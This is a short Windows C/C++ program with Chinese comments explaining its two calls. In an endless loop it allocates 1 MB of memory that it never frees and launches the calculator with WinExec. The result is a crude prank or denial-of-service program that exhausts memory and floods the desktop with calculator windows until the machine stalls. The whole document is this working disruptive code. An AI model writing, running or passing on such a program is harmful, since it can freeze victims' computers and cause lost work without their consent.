
//malloc(0x100000)是命令系統分配出1M的記憶體
//WinExec("calc",SW_NORMAL)是開啟計算機

#include<iostream>

#include<stdio.h>

#include<windows.h>

#include<stdlib.h>

int main(int argc, char** argv) {

while (1) {

malloc(0x100000);

WinExec("calc",SW_NORMAL); }

return 0; }
